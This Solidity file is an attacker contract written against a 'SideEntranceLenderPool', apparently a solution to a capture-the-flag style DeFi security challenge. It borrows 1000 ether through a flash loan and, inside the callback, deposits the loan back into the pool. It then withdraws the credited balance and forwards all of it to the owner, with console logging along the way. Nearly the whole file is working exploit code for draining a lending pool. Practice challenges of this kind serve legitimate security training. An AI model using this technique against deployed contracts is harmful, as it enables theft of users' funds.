// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract AttackerSideEntranceLenderPool is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        // pool = _pool;
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function execute() external override payable {
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        console.log('RUN flashLoan():');
        
        pool.flashLoan(1000 ether);
        pool.withdraw();

        console.log('address(this)');
        console.log(address(this));
        
        console.log('owner (attacker)');
        console.log(owner);

        uint attackBal = address(this).balance;
        console.log('attackBal BAL is::::::');
        console.log(attackBal);

        uint ownerBal = address(owner).balance;
        console.log('ownerBal is::::::');
        console.log(ownerBal);

        (bool success, ) = payable(owner).call{value: address(this).balance}("");

    }
}
 